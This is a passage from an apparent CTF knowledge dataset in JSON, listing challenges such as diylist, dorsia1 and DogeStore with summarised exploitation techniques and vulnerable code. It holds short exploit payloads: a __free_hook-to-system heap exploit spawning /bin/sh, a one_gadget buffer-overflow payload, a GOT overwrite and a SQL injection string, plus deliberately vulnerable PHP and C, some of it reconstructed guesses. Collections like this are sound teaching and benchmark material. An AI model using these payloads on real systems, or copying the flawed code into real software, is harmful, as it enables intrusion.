    },
    {
        "name": "dividing_secrets",
        "write_up": "dataset/raw/dividing_secrets.md",
        "type": "crypto",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 434,
        "max_score": 500,
        "difficulty": 0.868,
        "knowledge": [
            "When solving cryptographic challenges involving exponentiation under a prime modulus, if direct inversion of operations or solving for the exponent is computationally infeasible (like in the Discrete Logarithm Problem), consider exploiting provided server functionality to manipulate the exponent in a manner that simplifies brute-forcing. For example, dividing the exponent by a significant factor can reduce the problem to a smaller, more manageable search space.",
            "In challenges allowing controlled manipulation of an encrypted secret's exponent, leverage bit-shifting techniques to isolate and solve for small portions of the secret one segment at a time. Specifically, divide the exponent to shift it right by a set number of bits (ideally matching the secret's segmentation), then brute-force the now-topmost segment of the secret before proceeding to further segments. This method effectively reduces the complexity of brute-forcing the entire secret at once, by tackling it in smaller, more manageable chunks. \n\nExample payload snippet in Python: \n```python\nposition = 504  # Starting bit position to isolate top 8 bits of the secret\ntop_bits = 0  # Accumulator for the known top bits of the secret\n\nwhile position >= 0:  \n    r.recvuntil(\"number> \")  \n    r.sendline(str(2**position))  # Divide the exponent to shift secret to the right\n    h = int(r.recvline().decode())  # Get the server's response for the divided secret\n    for i in range(256):  # Brute-force guess for the current 8 bits of the secret\n        if pow(g, (top_bits << 8) | i, p) == h:  # If guess is correct\n            sys.stdout.write(chr(i))  # Output the discovered character\n            top_bits = (top_bits << 8) | i  # Update the known top bits of the secret\n            position -= 8  # Move to the next 8 bits\n            break\n```"
        ],
        "key": "```python\nimport random\n\nFLAG = b\"corctf{qu4drat1c_r3s1due_0r_n0t_1s_7h3_qu3st1on8852042051e57492}\"\n\ndef get_prime(bits):\n    while True:\n        p = random.getrandbits(bits)\n        if p % 2 == 0:\n            continue\n        if all(p % i != 0 for i in range(3, int(p**0.5) + 1, 2)):\n            return p\n\np = get_prime(512)\ng = random.randint(2, p - 1)\nx = int.from_bytes(FLAG, \"big\")\nenc = pow(g, x, p)\n\ndef divide_exponent(divisor):\n    global x\n    x //= divisor\n    return pow(g, x, p)\n```"
    },
    {
        "name": "diylist",
        "write_up": "dataset/raw/diylist.md",
        "type": "pwn",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 453,
        "max_score": 755,
        "difficulty": 0.6,
        "knowledge": [
            "To exploit type confusion vulnerabilities, one can manipulate union data structures to misinterpret the type of data stored, enabling arbitrary read or write capabilities. This can be done by asking the application to interpret the data in a union as a different type than it was initially stored as. In scenarios where unions are part of the data structure, carefully crafted inputs can lead to out-of-bounds read or write, leveraging differences in data sizes and representations.",
            "For exploiting double-free vulnerabilities, predicting or controlling the memory layout allows one to strategically place objects in memory to be freed multiple times. This can lead to code execution by poisoning the tcache or fastbin list of the malloc implementation with a controlled pointer. The exploitation chain can include allocating a controlled payload at a predictable location, freeing it to introduce a vulnerability, and then manipulating the application's memory allocation to execute arbitrary code or alter program behavior. In exploitation contexts where heap manipulation is possible, one could:\n   - Add a controlled object to the heap.\n   - Free it multiple times to trigger a double-free condition.\n   - Exploit the vulnerable state to hijack control flow, such as overwriting `__free_hook` with the address of `system`, and then triggering `free` on a string containing a command like `/bin/sh` to spawn a shell.\n\nExample payload for hijacking `__free_hook` with `system` and executing `/bin/sh`:\n```\nadd($t, 3, pack(\"Q\", $libc_address_of___free_hook));\nadd($t, 3, pack(\"Q\", $libc_address_of_system));\nadd($t, 3, \"/bin/sh\\0\");\ndel($t, index_of_bin_sh_string);\n```"
        ],
        "key": "```c\ntypedef union {\n  char *p_char;\n  long d_long;\n  double d_double;\n} Data;\n\ntypedef struct {\n  int size;\n  int max;\n  Data *data;\n} List;\n```"
    },
    {
        "name": "diysig",
        "write_up": "dataset/raw/diysig.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 394,
        "max_score": 755,
        "difficulty": 0.5218543046357615,
        "knowledge": [
            "In challenges involving cryptographic signature systems with an LSB (Least Significant Bit) Oracle vulnerability, one can exploit the system by using the LSB of the decryption of a manipulated ciphertext to perform a binary search for the plaintext message. This is predicated on the ability to manipulate ciphertext ('c') and query the oracle with `pow(x, e, n) * c % n`, adjusting 'x' each time to refine the search space based on the LSB of the decryption result. This method specifically applies when the Oracle reveals the parity of the decrypted message, allowing for a binary search approach to determine the original message.",
            "The process of iterative halving or binary searching in cryptographic challenges with an LSB oracle involves adjusting the factor `pow(1 << i, e, n)` in the manipulated ciphertext query to systematically guess and narrow down the possible range of the plaintext message. This technique relies on the property that if the LSB of the decrypted result is '0', the decrypted plaintext is less than or equal to half the modulus 'n', and if '1', it is greater, thereby revealing information about the plaintext bit by bit until the original message is determined. This approach is effective in cryptographic systems where the parity (odd or even nature) of the plaintext can indirectly reveal information about the plaintext itself.\n\nExample payload structure (Python code snippet):\n```python\nfor i in range(bitlength_of_n):\n    manipulated_ciphertext = pow(2**i, e, n) * c % n\n    if oracle(manipulated_ciphertext) == 0:\n        # Adjust the search space based on the oracle's response\n        # indicating that the true plaintext is less than or equal to half of n\n    else:\n        # Adjust the search space based on the oracle's response\n        # indicating that the true plaintext is greater than half of n\n```"
        ],
        "key": "```python\n# Stage 3  \nH = H | 1 if m & 1 else H & 0xfffffffe  \nreturn H  \n```"
    },
    {
        "name": "Do U Have Knowledge_",
        "write_up": "dataset/raw/Do U Have Knowledge_.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": -1.0,
        "max_score": 497,
        "difficulty": -1,
        "knowledge": [
            "For challenges leveraging the Python `random` module seeded with a predictable value such as the current time, it is possible to predict future outputs of the random number generator if the seed value (e.g., server timestamp) is known or can be closely approximated. This knowledge can be utilized to bypass randomness-based security mechanisms by mirroring the sequence generation on the attacker's side.\n   - To exploit this, seed a local instance of the random number generator with the predicted seed value and generate values in the same sequence as the target application. Example: `random.seed(predicted_seed_value)` followed by `predicted_value = random.randint(1, 65535)`.",
            "When dealing with cryptographic algorithms that incorporate timestamps as a part of their randomness or state generation mechanism, precision discrepancies between the attacker\u2019s environment and the target system can be overcome through brute force. Specifically, if the exact timestamp (to the required precision) used in cryptographic operations is partially known but not to its full precision, varying the unknown part of the timestamp in a brute-force manner can lead to the discovery of the correct input parameters.\n   - This approach involves generating potential cryptographic keys or states by iterating over the range of possible timestamp values that were not directly observable. For instance, if a timestamp `ts` is known to a certain precision, and a cryptographic operation utilizes a higher precision timestamp, one could iterate over all possible values of `ts + delta`, where `delta` is the range of uncertainty in the timestamp. Example: Loop through a given range of milliseconds or microseconds appended to the known timestamp part to recreate the cryptographic operation's input parameters."
        ],
        "key": "```python  \n   def _get_random_block(self):  \n       t = self._get_timestamp()  \n       cipher = Cipher(algorithms.AES(b'1234567890123456'), modes.ECB(), backend = default_backend())  \n       c1 = cipher.encryptor().update(t)  \n       c2 = bytes([c1[i] ^ self._state[i] for i in range(16)])  \n       o = cipher.encryptor().update(c2)  \n       c3 = bytes([c1[i] ^ o[i] for i in range(16)])  \n       self._state = cipher.encryptor().update(c3)  \n       return o  \n```"
    },
    {
        "name": "Do You Know GIF_",
        "write_up": "dataset/raw/Do You Know GIF_.md",
        "type": "The type of challenge is `forensics`.",
        "competition": [
            "DanteCTF/2023",
            "https://ctftime.org/event/2000/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering a file in a CTF challenge, using tools designed for steganography such as `steghide`, `stegoveritas`, and `stegextract` can be a crucial initial step to uncover hidden data within the file. However, if these tools yield no result, exploring the metadata of the file with tools like `exiftool` can reveal hidden comments or data embedded within.",
            "In a situation where an initial examination with `exiftool` does not reveal useful information, using additional options such as `-a` to exhaustively display all available information including hidden or duplicate comments is necessary. These comments may contain parts of a flag or clues for further steps in a CTF challenge and can be in various formats, including hexadecimal strings that may need conversion to human-readable format.\n\nExample payload for extracting all comments with exiftool:\n```bash\nexiftool -a dante.gif | grep Comment\n```"
        ],
        "key": "```python\ndef extract_comments_from_gif(file_path):\n    comments = []\n    with open(file_path, 'rb') as f:\n        data = f.read()\n        index = 0\n        while index < len(data):\n            if data[index:index+2] == b'\\x21\\xFE':  # GIF comment extension\n                index += 2\n                block_size = data[index]\n                index += 1\n                comment = b''\n                while block_size != 0:\n                    comment += data[index:index+block_size]\n                    index += block_size\n                    block_size = data[index]\n                    index += 1\n                comments.append(comment.decode('ascii', errors='ignore'))\n            else:\n                index += 1\n    return comments\n\n# Example usage\ncomments = extract_comments_from_gif('dante.gif')\nfor comment in comments:\n    print(comment)\n```\n"
    },
    {
        "name": "Do you know them _",
        "write_up": "dataset/raw/Do you know them _.md",
        "type": "forensics",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "To find recently accessed folders in a Windows environment, especially during forensic analysis of an E01 image, use the NTUSER.DAT file located in the user's profile directory. The key `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\Folder` contains values referenced by `MRUListEx` which indicates the order of the most recently used documents or folders. Tools like regripper and Registry Explorer can be used to parse these keys and values for data extraction, leading to the identification of the last accessed folder.",
            "For identifying the last keyword searched and the last link entered in a Windows environment, the NTUSER.DAT registry hive holds significant information. The last keyword can be extracted from the path `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery`, and for browsers like Internet Explorer, the last typed URL can be found under `SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs`. Each value under these keys, particularly the first values (like the first word in WordWheelQuery and url1 in TypedURLs), provides the necessary details. Utilizing forensic tools to analyze and extract these values is essential for gathering such information."
        ],
        "key": "```python\n# Possible vulnerable code snippet for accessing Windows Registry\n\nimport winreg\n\ndef get_recent_docs_folder():\n    try:\n        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\Folder\")\n        mru_list_ex, _ = winreg.QueryValueEx(reg_key, \"MRUListEx\")\n        first_value_name = f\"{mru_list_ex[0]}\"\n        recent_folder, _ = winreg.QueryValueEx(reg_key, first_value_name)\n        return recent_folder\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n        return None\n\ndef get_last_keyword_searched():\n    try:\n        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery\")\n        mru_list_ex, _ = winreg.QueryValueEx(reg_key, \"MRUListEx\")\n        first_value_name = f\"{mru_list_ex[0]}\"\n        last_keyword, _ = winreg.QueryValueEx(reg_key, first_value_name)\n        return last_keyword\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n        return None\n\ndef get_last_link_entered():\n    try:\n        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r\"SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs\")\n        last_url, _ = winreg.QueryValueEx(reg_key, \"url1\")\n        return last_url\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n        return None\n\nrecent_folder = get_recent_docs_folder()\nlast_keyword = get_last_keyword_searched()\nlast_url = get_last_link_entered()\n\nprint(f\"Recent Folder: {recent_folder}\")\nprint(f\"Last Keyword: {last_keyword}\")\nprint(f\"Last URL: {last_url}\")\n```\n"
    },
    {
        "name": "Do You Still Feel Lucky",
        "write_up": "dataset/raw/Do You Still Feel Lucky.md",
        "type": "pwn",
        "competition": [
            "TBTL/2023",
            "https://ctftime.org/event/2002/tasks/"
        ],
        "score": 944,
        "max_score": 1000,
        "difficulty": 0.944,
        "knowledge": [
            "In a challenge involving guessing a flag with partial correctness feedback, an exploitation strategy can be crafted by taking advantage of how memory allocation and deallocation work in conjunction with input handling functions like `fgets`. Specifically, if `malloc` for the guess buffer reuses the heap space previously occupied by the flag buffer, which still contains the flag due to the way `fgets` works with heap memory, attackers can incrementally guess the flag one character at a time by leveraging the feedback system. This approach requires understanding of the underlying memory management mechanisms.",
            "To exploit a scenario where the program provides feedback based on the number of correctly guessed characters in a flag, and where an input's length affects the comparison logic, one can send prefixes of the correct guess to receive feedback that guides the next guess. This is particularly useful when the program logic compares an input against the flag character by character, up to the length of user-provided input, allowing for an incremental search strategy to find the entire flag string successfully. This exploitation technique requires crafting inputs that exploit the comparison logic's handling of string lengths and termination characters. \n\nSample of payload to test and guess the flag one character at a time:\n```python\nimport string\n\ndef guess(k, s):  \n   # Assuming p is a connection to the challenge server\n   p.sendlineafter(b':\\n', str(k).encode())  \n   p.sendlineafter(b':\\n', s.encode())  \n   ret = p.recvline()  \n   return ret.strip().decode('ascii')  \n  \nflag_prefix = 'TBTL'  # A known correct prefix of the flag\nfor i in range(60):  # Assuming the flag length could be up to 60 characters\n   for x in string.printable:  \n       result = guess(64, flag_prefix+x)  \n       if result == 'Got it!':  \n           print(flag_prefix+x)  \n           break  \n       elif result.startswith('A'):  # Feedback indicating almost correct guess\n           flag_prefix += x  \n           break\n```"
        ],
        "key": "```c\nvoid guess_flag() {  \n int guess_length;  \n char *guess;  \n int ncorrect;  \n int i;  \n  \n puts(\"Try to guess the flag!\");  \n puts(\"Enter the length of your guess:\");  \n scanf(\"%d\", &guess_length);  \n getchar();  \n guess = malloc(guess_length);  \n puts(\"Enter your guess:\");  \n fgets(guess, guess_length, stdin);\n\n ncorrect = 0;  \n for (i=0; i<guess_length && i<flag_length; i++)  \n   if (guess[i] == flag[i])  \n     ncorrect++;\n\n if (ncorrect == flag_length)  \n   puts(\"Got it!\");  \n else if (ncorrect == flag_length-2)  \n   puts(\"Almost!\");  \n else if (ncorrect*2 >= flag_length)  \n   puts(\"Getting there!\");  \n else  \n   puts(\"Not even close.\");  \n  \n free(guess);  \n}  \n```"
    },
    {
        "name": "Dodge",
        "write_up": "dataset/raw/Dodge.md",
        "type": "misc",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 906,
        "max_score": 906,
        "difficulty": 1.0,
        "knowledge": [
            "In challenges that involve predicting the behavior of moving objects (such as bullets in a dodge game), objects' future positions can often be deterministically calculated if their velocity and direction are known. This is particularly useful in games or simulations where objects follow simple, predictable physics rules. A strategy to track and forecast the movement of such objects can be implemented as follows:\n   - Establish the initial position of the object.\n   - Observe the object's movement over two intervals to determine its velocity and direction.\n   - Use the observed velocity and direction to predict future positions, adjusting for any environmental factors like collisions which may alter its trajectory.",
            "When tackling tasks that require sustained interaction or evasion based on an environment's state (like avoiding bullets for many rounds in a game), implementing a heuristic algorithm that anticipates future states based on current and past information can be highly effective. This approach can circumvent the need for direct control over every aspect of the challenge and instead focus on maintaining a condition (such as survival in a dodge game) through predictive adjustments. Specifically for challenges involving collision detection and avoidance:\n   - After determining the motion pattern of obstacles (bullets), plan movements (of the player) to avoid future collisions. This involves calculating safe zones or paths by considering the trajectory of moving obstacles and adjusting the player's position accordingly.\n   - Continuously update these calculations as additional obstacles appear or as existing obstacles' trajectories change due to game mechanics like bouncing off walls."
        ],
        "key": "```python\nimport random\n\nclass Game:\n    def __init__(self):\n        self.width = 40\n        self.height = 20\n        self.player_pos = [random.randint(1, self.height-2), random.randint(1, self.width-2)]\n        self.player_velocity = [random.choice([-1, 1]), random.choice([-1, 1])]\n        self.bullets = []\n\n    def spawn_bullet(self):\n        if len(self.bullets) % 3 == 0:\n            bullet_pos = [random.randint(1, self.height-2), random.randint(1, self.width-2)]\n            bullet_velocity = [random.choice([-1, 1]), random.choice([-1, 1])]\n            self.bullets.append({'pos': bullet_pos, 'velocity': bullet_velocity})\n\n    def move_player(self, direction):\n        if direction == 'w':\n            self.player_pos[0] -= 1\n        elif direction == 's':\n            self.player_pos[0] += 1\n        elif direction == 'a':\n            self.player_pos[1] -= 1\n        elif direction == 'd':\n            self.player_pos[1] += 1\n\n    def move_bullets(self):\n        for bullet in self.bullets:\n            bullet['pos'][0] += bullet['velocity'][0]\n            bullet['pos'][1] += bullet['velocity'][1]\n\n    def check_collision(self):\n        for bullet in self.bullets:\n            if bullet['pos'] == self.player_pos:\n                return True\n        return False\n\n    def play_round(self, direction):\n        self.move_player(direction)\n        self.move_bullets()\n        self.spawn_bullet()\n        return self.check_collision()\n\ngame = Game()\nrounds = 0\nwhile rounds < 120:\n    direction = random.choice(['w', 'a', 's', 'd'])\n    if game.play_round(direction):\n        print(\"Game Over\")\n        break\n    rounds += 1\nprint(\"Survived rounds:\", rounds)\n```"
    },
    {
        "name": "DogeStore",
        "write_up": "dataset/raw/DogeStore.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 267,
        "max_score": 500,
        "difficulty": 0.534,
        "knowledge": [
            "When dealing with a constant nonce in AES-256 CTR mode encryption, a vulnerability arises because the XOR pad generated remains constant for different encryptions. This can be exploited by creating hash collisions through carefully crafted byte manipulations, particularly in scenarios utilizing run-length encoding. This vulnerability stems from the fact that in CTR mode, the ciphertext is XOR-ed with a constant pad, making every bit-flip in the ciphertext directly influence the decrypted plaintext at the same offset. This can lead to potential information disclosure or manipulation of encrypted data if the nonce and counter are reused, undermining the encryption's integrity.",
            "A specific method to exploit the reused nonce in AES-256 CTR encrypted data, leveraging run-length encoding and SHA3 hashing for hash collisions, involves sending modified ciphertexts to the server and comparing the resulting hash values to infer information about the XOR pad used for encryption. By incrementing or decrementing counts of characters in the run-length encoding process and observing when hash collisions occur, attackers can recover XOR differences between adjacent encrypted bytes. This requires generating payloads that adjust the least significant bit of count bytes in adjacent run-length encoded units and analyzing how changes affect the SHA3 hash output. Example payloads for manipulating the counts would look like this in pseudocode: `xor_payload(offset, l1, c1, l2, c2)`, where `l1`, `c1` are the letter and count at one position, and `l2`, `c2` are the manipulated values at an adjacent position, aiming to toggle the least significant bit to induce a hash collision."
        ],
        "key": "```rust  \nconst FLAG_SIZE: usize = 56;  \nconst FLAG_DATA_SIZE: usize = FLAG_SIZE * 2;\n\n#[derive(Debug, Copy, Clone)]  \nstruct Unit {  \n   letter: u8,  \n   size: u8,  \n}\n\nfn deserialize(data: &Vec<u8>) -> Vec<Unit> {  \n   let mut secret = Vec::new();  \n   for (letter, size) in data.iter().tuples() {  \n       secret.push(Unit {  \n           letter: *letter,  \n           size: *size,  \n       });  \n   }  \n   secret  \n}\n\nfn decode(data: &Vec<Unit>) -> Vec<u8> {  \n   let mut res = Vec::new();  \n   for &Unit { letter, size } in data.iter() {  \n       res.extend(vec![letter; size as usize + 1].iter())  \n   }  \n   res  \n}\n\nfn decrypt(data: &Vec<u8>) -> Vec<u8> {  \n   key = get_key();  \n   iv = get_iv();  \n   openssl::symm::decrypt(  \n       openssl::symm::Cipher::aes_256_ctr(),  \n       &key,  \n       Some(&iv),  \n       data  \n   ).unwrap()  \n}\n\nfn store(data: &Vec<u8>) -> String {  \n   assert!(  \n       data.len() == FLAG_DATA_SIZE,  \n       \"Wrong data size ({} vs {})\",  \n       data.len(),  \n       FLAG_DATA_SIZE  \n   );  \n   let decrypted = decrypt(data);  \n   let secret = deserialize(&decrypted);  \n   let expanded = decode(&secret);  \n   base64::encode(&compute_sha3(&expanded)[..])  \n}  \n```"
    },
    {
        "name": "door lock",
        "write_up": "dataset/raw/door lock.md",
        "type": "web",
        "competition": [
            "CyberGrabs/2021",
            "https://ctftime.org/event/1353/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "For SQL Injection challenges where the initial payload attempts do not yield the desired outcomes, it's advisable to observe other potential vectors such as URL parameters that may be susceptible to different types of vulnerabilities. In this scenario, switching focus from a direct SQL injection in the login form to exploiting an Insecure Direct Object Reference (IDOR) vulnerability via manipulation of URL parameters can lead to success. Example payload for initial SQLi attempt: `admin' or '1'='1`",
            "In situations where an IDOR vulnerability is suspected, especially when specific parameters like `?id=` are present in the URL, tools like Burp Suite can be highly effective in automating the process of brute-forcing these parameter values to uncover hidden or unauthorized resources. This method involves systematically testing a range of values for the parameter until an unexpected access is granted or sensitive information is revealed."
        ],
        "key": "```php\n<?php\n// Example of a possible vulnerable code snippet based on the context\n$id = $_GET['id'];\n$query = \"SELECT * FROM users WHERE id = '$id'\";\n$result = mysqli_query($conn, $query);\n\nif ($result) {\n    $user = mysqli_fetch_assoc($result);\n    echo \"Welcome, \" . $user['username'];\n} else {\n    echo \"User not found.\";\n}\n?>\n```"
    },
    {
        "name": "DoRSA",
        "write_up": "dataset/raw/DoRSA.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 450,
        "max_score": 477,
        "difficulty": 0.9433962264150944,
        "knowledge": [
            "For challenges involving RSA encryption where multiple related RSA modular products (n) are given, exploring the relationship between these products using continued fractions can lead to identifying small fractional approximations. These approximations can help in revealing factors such as \\(k/x\\) where \\(k\\) and \\(x\\) are integral parts of the RSA setup, and their relation to \\(e\\) and \\(\\phi\\) is crucial. This approach is particularly effective when the difference between the numerator and denominator in \\(n_2/n_1\\) is significantly small, allowing the deduction of possible values of \\(k\\) and \\(x\\), facilitating the decryption process without directly factoring \\(n\\).",
            "When you have an estimated range or approximation of \\(\\phi\\) (Euler's totient function) in RSA, it's feasible to decrypt the ciphertext without completely factoring the modulus \\(n\\). This method involves using the bounds of \\(\\phi\\) to determine its value through congruences and continued fraction approximations. Once \\(\\phi\\) is estimated, one can compute the private exponent \\(d\\) from \\(e\\) and \\(\\phi\\), which is crucial for decryption. This approach proves useful in scenarios where direct factorization is infeasible, but enough information is available to approximate \\(\\phi\\).\n\nSample of Python code used for the decryption process once a relationship between the RSA parameters is established:\n```python\nfrom Crypto.Util.number import inverse, long_to_bytes\nfrom tqdm import tqdm\nfrom sage.all import continued_fraction, GCD, crt\n\n# Given values\ne = 93546309251892226642049894791252717018125687269405277037147228107955818581561  \nn_1 = 36029694445217181240393229507657783589129565545215936055029374536597763899498239088343814109348783168014524786101104703066635008905663623795923908443470553241615761261684865762093341375627893251064284854550683090289244326428531870185742069661263695374185944997371146406463061296320874619629222702687248540071  \nenc_1 = 4813040476692112428960203236505134262932847510883271236506625270058300562795805807782456070685691385308836073520689109428865518252680199235110968732898751775587988437458034082901889466177544997152415874520654011643506344411457385571604433702808353149867689652828145581610443408094349456455069225005453663702  \n\n# Use continued fractions to find k/x\nc = continued_fraction(Integer(n_2) / Integer(n_1))\nfor i in tqdm(range(1, 150)):  \n   k = c.numerator(i)  \n   x = c.denominator(i)  \n   if GCD(e, k) != 1:  \n       continue  \n   res = inverse(e - k, e)  \n   md = e * x // GCD(e, x)\n   st = crt(res, 0, e, x) + (n_1 // md) * md - 100 * md  \n   for j in range(200):  \n       if GCD(e, st) != 1:  \n           st += md  \n           continue  \n       d_1 = inverse(e, st)  \n       flag = long_to_bytes(pow(enc_1, d_1, n_1))  \n       if b\"CCTF\" in flag:  \n           print(flag)  \n       st += md  \n```\nThis approach illustrates how cryptanalytic methods can be applied to RSA variants, leveraging mathematical properties and computational techniques to achieve decryption under specific constraints."
        ],
        "key": "```python  \n#!/usr/bin/env python3\n\nfrom Crypto.Util.number import *  \nfrom math import gcd  \nfrom flag import FLAG\n\ndef keygen(nbit, dbit):  \n   assert 2*dbit < nbit  \n   while True:  \n       u, v = getRandomNBitInteger(dbit), getRandomNBitInteger(nbit // 2 - dbit)  \n       p = u * v + 1  \n       if isPrime(p):  \n           while True:  \n               x, y = getRandomNBitInteger(dbit), getRandomNBitInteger(nbit // 2 - dbit)  \n               q = u * y + 1  \n               r = x * y + 1  \n               if isPrime(q) and isPrime(r):  \n                   while True:  \n                       e = getRandomNBitInteger(dbit)  \n                       if gcd(e, u * v * x * y) == 1:  \n                           phi = (p - 1) * (r - 1)  \n                           d = inverse(e, phi)  \n                           k = (e * d - 1) // phi  \n                           s = k * v + 1  \n                           if isPrime(s):  \n                               n_1, n_2 = p * r, q * s  \n                               return (e, n_1, n_2)\n\ndef encrypt(msg, pubkey):  \n   e, n = pubkey  \n   return pow(msg, e, n)\n\nnbit, dbit = 1024, 256\n\ne, n_1, n_2 = keygen(nbit, dbit)\n\nFLAG = int(FLAG.encode(\"utf-8\").hex(), 16)\n\nc_1 = encrypt(FLAG, (e, n_1))  \nc_2 = encrypt(FLAG, (e, n_2))\n\nprint('e =', e)  \nprint('n_1 =', n_1)  \nprint('n_2 =', n_2)\n\nprint('enc_1 =', c_1)  \nprint('enc_2 =', c_2)  \n```"
    },
    {
        "name": "dorsia1",
        "write_up": "dataset/raw/dorsia1.md",
        "type": "pwn",
        "competition": [
            "WPICTF/2020",
            "https://ctftime.org/event/913/tasks/"
        ],
        "score": 100,
        "max_score": 400,
        "difficulty": 0.25,
        "knowledge": [
            "In buffer overflow challenges where stack alignment is manipulated or atypical, it is crucial to carefully calculate the precise amount of padding needed to overwrite the return address. This calculation should take into account the size of the local buffer, any saved base pointer (if applicable), and the specific alignment or offset introduced by the challenge. The hint provided ('A' * 77) is instrumental in determining the correct padding length to reach the return address. For example, with a local buffer of 69 bytes and assuming an 8-byte base pointer (for a 64-bit architecture), padding would be calculated as the sum of these values plus any alignment adjustments mentioned in the challenge.",
            "When the source code of a challenge leaks an address within the libc library (as seen with `printf(\"%p\\n\",system+765772);`), it can be exploited to calculate the base address of libc, and from there, offsets for specific functions or \"one_gadget\" RCE (Remote Code Execution) addresses can be applied to achieve arbitrary code execution. This requires understanding the leaked address, knowing the offset to a known function like `system()`, and leveraging tools like `one_gadget` to find gadgets within the libc version provided or hinted at by the challenge. This strategy is particularly effective when other protections, such as ASLR (Address Space Layout Randomization), are mitigated by the leak.\n    - Example of calculating offsets and sending payload to achieve code execution:\n        ```python\n        leak = int(p.recvline(), 16)  # Address leaked from the challenge\n        system = leak - 765772  # Calculate the actual system() address\n        libc_base = system - e.sym['__libc_system']  # Determine libc base\n        one_gadget = libc_base + 0x4f322  # Offset for one_gadget\n        padding = b'A' * 77  # Padding calculated based on buffer size and alignment hints\n        payload = padding + p64(one_gadget)  # Crafting the payload\n        p.sendline(payload)  # Sending the payload\n        ```"
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>\n\nvoid main() {  \n   char a[69];  \n   printf(\"%p\\n\",system+765772);  \n   fgets(a,96,stdin);  \n}  \n```"
    },
    {
        "name": "dorsia4",
        "write_up": "dataset/raw/dorsia4.md",
        "type": "pwn",
        "competition": [
            "WPICTF/2020",
            "https://ctftime.org/event/913/tasks/"
        ],
        "score": 400,
        "max_score": 400,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting a binary with partial RELRO, it is possible to overwrite the Global Offset Table (GOT) by providing a negative number as an index if the application logic allows it. This technique can be utilized to redirect execution flow to arbitrary code, such as a One-gadget RCE (Remote Code Execution) if conditions like needing to maintain the program's input functionality (e.g., scanf) prevent direct exploitation.",
            "In situations where direct writing to an address (e.g., GOT entry for a function like printf) is necessary and possible, but segment protection causes segmentation faults when attempting large writes or certain byte values, a brute-force approach of writing byte by byte can be employed. This method involves iteratively sending different bytes to the target address, monitoring for crashes or successful executions, and adjusting the payload accordingly to construct the desired address in memory without causing a segmentation fault. This can be particularly effective when setting up the environment for a One-gadget RCE, where the exact bytes of the gadget's address must be written into the GOT to hijack the execution flow.\n\nSample of payload for writing byte by byte without causing segmentation fault:\n\n```  \ns.sendline(\"-103 \" + \"91\")  # Setting up a specific byte value at a chosen offset\ns.sendline(\"-102 \" + \"b0\")  # Continues writing bytes to construct an address\ns.sendline(\"-103 \" + \"38\")  \ns.sendline(\"-104 \" + \"22\")  # Final byte to complete the address setup for One-gadget RCE\n```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid vuln() {\n    int i;\n    char buffer[100];\n    printf(\"Enter index: \");\n    scanf(\"%d\", &i);\n    printf(\"Enter data: \");\n    scanf(\"%s\", buffer);\n    buffer[i] = 'A'; // Vulnerability: No bounds checking on 'i'\n}\n\nint main() {\n    vuln();\n    return 0;\n}\n```"
    },
    {
        "name": "Double Message",
        "write_up": "dataset/raw/Double Message.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 201,
        "max_score": 906,
        "difficulty": 0.22185430463576158,
        "knowledge": [
            "When dealing with RSA encryption challenges where two messages are encrypted with a similar method but with slight variations (e.g., different padding), Coppersmith's short pad attack can be utilized if the length of the padding is known. This attack allows for the extraction of the plaintext when the difference in padding between the two messages is short, in this scenario, 128 bits due to the usage of MD5 hashing for padding. This method is particularly useful when you have enough information about the padding's length and properties.",
            "In scenarios where two related messages are encrypted (e.g., they differ by a known modification or padding), applying the Franklin-Reiter Related Message Attack is effective. This requires knowledge of how the messages are related and the RSA modulus. If the difference or relation between the two messages can be succinctly expressed, this attack can reveal the original plaintexts without requiring the decryption key. This method is highly effective for closely related messages, especially when one message is a known alteration of the other.\n\nExample related knowledge for Franklin-Reiter Related Message Attack:\n```python\n# Assuming e = 3, N is the RSA modulus, C1 and C2 are the ciphertexts\nR.<x> = PolynomialRing(Zmod(N))\nf1 = x^3 - C1\nf2 = (x + diff)^3 - C2\nresult = f1.resultant(f2)\nroots = result.roots()\nFlag = roots[0][0] - diff\n```"
        ],
        "key": "```python\nM1 = Flag + md5(Flag).digest()  \nM2 = Flag + md5(b'One more time!' + Flag).digest()  \n```"
    },
    {
        "name": "Double Miff",
        "write_up": "dataset/raw/Double Miff.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 217,
        "max_score": 477,
        "difficulty": 0.4549266247379455,
